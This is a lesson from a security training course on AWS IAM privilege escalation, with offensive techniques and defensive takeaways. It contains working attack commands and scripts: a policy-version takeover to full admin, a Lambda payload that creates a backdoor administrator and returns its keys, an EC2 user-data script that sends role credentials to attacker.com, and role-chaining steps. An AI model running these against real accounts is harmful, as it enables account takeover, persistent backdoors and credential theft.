---
title: "IAM Misconfiguration Attacks — Overly Permissive Roles, Inline Policies,
  Role Chaining"
tags: [AWS, IAM, privilege-escalation, role-chaining, PassRole, inline-policy,
       misconfiguration, ATT&CK-T1078.004, ATT&CK-T1098, cloud-exploitation]
module: 04-BroadSurface-02
day: 183
related_topics:
  - AWS IAM Fundamentals (Day 182)
  - SSRF to AWS Metadata Lab (Day 184)
  - AWS Enumeration with Pacu (Day 186)
  - Cloud Persistence Techniques (Day 191)
  - Cloud Hardening (Day 195)
---

# Day 183 — IAM Misconfiguration Attacks

> "Privilege escalation in AWS is not an exploit. It is a policy reading
> exercise. You find a credential, you enumerate what it can do, you find
> the IAM permission that lets you do more than the owner intended, and you
> use it. No shellcode. No buffer overflows. Just JSON policy documents and
> API calls. The hardest part is knowing which permissions are dangerous —
> and most defenders do not know the list."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Execute a privilege escalation path using `iam:CreatePolicyVersion` to
   grant yourself admin access.
2. Use `iam:PassRole` with `lambda:CreateFunction` to execute code as a
   high-privilege role.
3. Perform role chaining to escalate from a low-privilege role to a
   high-privilege role in the same account.
4. Identify overly permissive wildcard policies and inline policies in a
   real IAM enumeration output.
5. Use the AWS CLI to manually walk every privilege escalation path.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| AWS IAM fundamentals | Day 182 |
| AWS CLI configured | Day 182 |
| Python basics | Days 11–15 |

**Lab setup:**

```bash
cd learn-security/04-BroadSurface-02/samples/iam-lab/
# Uses LocalStack for offline practice
docker compose up -d
export AWS_ENDPOINT_URL=http://localhost:4566
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1

# Verify LocalStack is running
aws sts get-caller-identity --endpoint-url http://localhost:4566
```

---

## Part 1 — Identifying Dangerous Permissions

The starting point is always enumeration. Before exploiting, know what you have:

```bash
# Get current identity
aws sts get-caller-identity

# List all policies attached to the current user
USERNAME=$(aws sts get-caller-identity | jq -r '.Arn' | cut -d'/' -f2)
aws iam list-attached-user-policies --user-name $USERNAME
aws iam list-user-policies --user-name $USERNAME   # Inline policies

# For each attached policy, get the document
for policy_arn in $(aws iam list-attached-user-policies \
    --user-name $USERNAME | jq -r '.AttachedPolicies[].PolicyArn'); do
  echo "=== $policy_arn ==="
  version=$(aws iam get-policy --policy-arn $policy_arn \
    | jq -r '.Policy.DefaultVersionId')
  aws iam get-policy-version \
    --policy-arn $policy_arn \
    --version-id $version | jq '.PolicyVersion.Document'
done

# Check group memberships — groups inherit policies too
aws iam list-groups-for-user --user-name $USERNAME
```

**Dangerous permissions to grep for:**

```bash
# Pipe all policy documents through jq and look for high-risk actions
aws iam get-policy-version ... | jq '.PolicyVersion.Document.Statement[].Action' \
  | grep -E 'iam:|lambda:|ec2:|sts:|glue:|cloudformation:|codebuild:'
```

---

## Part 2 — Privilege Escalation via `iam:CreatePolicyVersion`

**Requirements:** `iam:CreatePolicyVersion` on the target policy, and
`iam:SetDefaultPolicyVersion` (or `--set-as-default` flag).

### Exploit

```bash
# 1. Find the ARN of a policy attached to your own user or a role you can assume
TARGET_POLICY="arn:aws:iam::123456789012:policy/dev-user-policy"

# 2. List existing versions (max 5; you may need to delete one first)
aws iam list-policy-versions --policy-arn $TARGET_POLICY

# 3. Create a new version with admin access and set it as default
aws iam create-policy-version \
  --policy-arn $TARGET_POLICY \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }' \
  --set-as-default

# 4. Verify — your policy now grants AdministratorAccess
aws iam get-policy-version \
  --policy-arn $TARGET_POLICY \
  --version-id v2 | jq '.PolicyVersion.Document'

# 5. Confirm privilege escalation
aws iam list-users   # Now succeeds where it failed before
```

**Impact:** The user's own policy now grants `"Action": "*", "Resource": "*"`.
Full account administrator.

---

## Part 3 — Privilege Escalation via `iam:PassRole` + `lambda:CreateFunction`

**Requirements:** `iam:PassRole` for a high-privilege role + `lambda:CreateFunction`
+ `lambda:InvokeFunction`.

This is one of the most common escalation paths in cloud penetration tests
because many DevOps pipelines need these permissions.

### Exploit

```python
# escalate_via_lambda.py
import boto3, zipfile, io, json

iam = boto3.client("iam")
lam = boto3.client("lambda")

HIGH_PRIV_ROLE = "arn:aws:iam::123456789012:role/admin-role"

# Step 1: Build the Lambda payload — creates a backdoor IAM user
lambda_code = """
import boto3

def handler(event, context):
    iam = boto3.client("iam")
    # Create backdoor user
    iam.create_user(UserName="shadow-admin")
    # Attach AdministratorAccess
    iam.attach_user_policy(
        UserName="shadow-admin",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
    )
    # Create access keys
    key = iam.create_access_key(UserName="shadow-admin")
    return {
        "AccessKeyId": key["AccessKey"]["AccessKeyId"],
        "SecretAccessKey": key["AccessKey"]["SecretAccessKey"],
    }
"""

# Step 2: Package as zip
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("index.py", lambda_code)
buf.seek(0)

# Step 3: Create Lambda with the high-privilege execution role
lam.create_function(
    FunctionName="escalation-payload",
    Runtime="python3.11",
    Role=HIGH_PRIV_ROLE,         # PassRole — this is the escalation
    Handler="index.handler",
    Code={"ZipFile": buf.read()},
    Timeout=30,
)

# Step 4: Invoke it — Lambda runs as admin-role
resp = lam.invoke(FunctionName="escalation-payload")
result = json.loads(resp["Payload"].read())
print(f"[+] Backdoor credentials created:")
print(f"    Access Key:    {result['AccessKeyId']}")
print(f"    Secret Key:    {result['SecretAccessKey']}")
```

```bash
# Run the escalation
python3 escalate_via_lambda.py

# Configure the new admin key
aws configure --profile shadow-admin
aws iam list-users --profile shadow-admin   # Confirms admin access
```

---

## Part 4 — Privilege Escalation via `iam:PassRole` + `ec2:RunInstances`

**Requirements:** `iam:PassRole` for a high-priv instance profile +
`ec2:RunInstances`.

Launch an EC2 instance with a high-privilege instance profile. The instance's
metadata endpoint exposes the role credentials. SSRF from the instance (or
SSH if you have key access) retrieves them.

```bash
# 1. Find an instance profile attached to a high-priv role
aws iam list-instance-profiles | jq '.InstanceProfiles[] | {Name: .InstanceProfileName, Role: .Roles[].RoleName}'

# 2. Launch an EC2 with the high-priv profile and your SSH key
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=high-priv-profile \
  --key-name my-keypair \
  --user-data '#!/bin/bash
    # On startup: post credentials to attacker server
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
      -o /tmp/role_name
    ROLE=$(cat /tmp/role_name)
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE \
      | curl -s -X POST http://attacker.com/creds -d @-
  '

# Alternatively: SSH into the instance and read metadata locally
ssh -i keypair.pem ec2-user@INSTANCE_IP
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/high-priv-role
```

---

## Part 5 — Role Chaining

Role chaining is the practice of assuming one role, then using that role to
assume another more-privileged role. It works when:

1. Role A's permissions include `sts:AssumeRole` for Role B
2. Role B's trust policy allows Role A to assume it

```bash
# Start: credentials for low-priv user
aws sts get-caller-identity
# → arn:aws:iam::123456789012:user/developer

# Step 1: Assume role-a (allowed by user's policy)
ROLE_A_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/dev-role \
  --role-session-name step1)

export AWS_ACCESS_KEY_ID=$(echo $ROLE_A_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_A_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ROLE_A_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity   # → arn:aws:iam::123456789012:role/dev-role

# Step 2: From dev-role, assume admin-role (allowed in dev-role's permissions)
ROLE_B_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/admin-role \
  --role-session-name step2)

export AWS_ACCESS_KEY_ID=$(echo $ROLE_B_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_B_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ROLE_B_CREDS | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity   # → arn:aws:iam::123456789012:role/admin-role
aws iam list-users            # Admin access confirmed
```

---

## Part 6 — Inline Policies and Hard-to-Audit Configurations

Inline policies are directly embedded in a user, group, or role rather than
being standalone managed policies. They are harder to audit because:

- They do not appear in `iam:ListPolicies`
- Tools that enumerate managed policies miss them
- They cannot be reused or referenced by ARN

```bash
# Managed policies — easy to find
aws iam list-policies --scope Local | jq '.Policies[].PolicyName'

# Inline policies — separate API calls, easy to miss
aws iam list-user-policies --user-name alice       # Returns inline policy names
aws iam get-user-policy --user-name alice --policy-name inline-admin-access

aws iam list-role-policies --role-name web-server-role
aws iam get-role-policy --role-name web-server-role --policy-name inline-policy
```

**Attacker's checklist for complete policy enumeration:**

```bash
for user in $(aws iam list-users | jq -r '.Users[].UserName'); do
  echo "=== User: $user ==="
  # Managed
  aws iam list-attached-user-policies --user-name $user \
    | jq '.AttachedPolicies[].PolicyArn'
  # Inline
  aws iam list-user-policies --user-name $user | jq '.PolicyNames[]'
  # Groups
  aws iam list-groups-for-user --user-name $user \
    | jq '.Groups[].GroupName'
done
```

---

## Part 7 — Cross-Account Role Assumption

When a trust policy's `Principal` references another account, that account's
principals can assume the role:

```json
// Role in account 123456789012 with cross-account trust
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::999999999999:root"},
    "Action": "sts:AssumeRole"
  }]
}
```

```bash
# From account 999999999999: assume role in account 123456789012
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/cross-account-admin \
  --role-session-name cross-account-attack

# Now operating in account 123456789012 as the cross-account role
aws iam list-users   # Enumerates users in the target account
```

**Attack scenario:** A shared services account has admin-equivalent cross-account
access to all production accounts. Compromise the shared services account → move
laterally to every production account via cross-account role assumption.

---

## Key Takeaways

1. **IAM privilege escalation requires no exploit code.** It is entirely
   API calls with valid credentials. The detection and prevention challenge
   is that these API calls look identical to legitimate administration.
2. **`iam:PassRole` is the most frequently misconfigured IAM permission.**
   It should always be restricted to specific role ARNs and specific services,
   never `"Resource": "*"`.
3. **Role chaining means the blast radius of a misconfiguration extends
   beyond the immediate role.** Audit which roles each role can assume, not
   just the role's own permissions.
4. **Inline policies are the audit blind spot.** Any comprehensive IAM
   review must enumerate inline policies separately. Automated tools that
   only check managed policies will miss them.
5. **Cross-account roles are the correct mechanism for multi-account access**
   — but misconfigured cross-account trust (e.g., `Principal: {"AWS": "*"}`)
   turns every account into an entry point for every other account.

---

## Exercises

1. On LocalStack: create a user with `iam:CreatePolicyVersion` and an
   attached policy. Walk through the privilege escalation: create a new
   permissive policy version, set it as default, confirm you can now call
   `iam:ListUsers`. Then: how would a defender detect this in CloudTrail?
2. Research the complete list of IAM privilege escalation methods documented
   by Rhino Security Labs. Pick three methods not covered in this lesson.
   Write the CLI commands for each.
3. Write a Python script that, given a set of AWS credentials, enumerates
   all attached and inline policies for the current principal and flags any
   that contain `"Action": "*"` or IAM write permissions.
4. Explain the defence: what IAM feature prevents a role from escalating
   its own privileges even if it has `iam:AttachUserPolicy`? How does a
   permission boundary work, and where would you set it to prevent the
   `create-policy-version` attack?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q183.1, Q183.2 …).
> Follow-up questions use hierarchical numbering (Q183.1.1, Q183.1.2 …).

---

## Navigation

← Previous: [Day 182 — AWS IAM Fundamentals](DAY-0182-AWS-IAM-Fundamentals.md)
→ Next: [Day 184 — SSRF to AWS Metadata Lab](DAY-0184-SSRF-to-AWS-Metadata-Lab.md)
